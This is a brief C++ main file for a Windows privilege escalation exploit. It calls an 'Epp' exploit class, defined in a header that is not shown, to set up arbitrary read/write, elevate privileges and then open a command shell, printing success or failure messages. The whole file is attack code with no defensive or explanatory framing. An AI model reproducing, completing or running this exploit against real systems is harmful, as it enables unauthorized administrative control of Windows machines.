#include <iostream>
#include <windows.h>
#include <winternl.h>
#include "Epp.h"

int main()
{
    Epp Exploit;
    if (Exploit.GetIsSetupped())
    {
        if (Exploit.ElevatePrivileges())
        {
            std::cout << "Successfully elevated privileges :)" << std::endl << std::endl;
            CreateCmd();
        }
        else
        {
            std::cout << "Failed to elevate privileges :(" << std::endl;
        }
    }
    else
    {
        std::cout << "Failed to setup arbirary read or write :(" << std::endl;
    }
    SuspendThread(GetCurrentThread());
}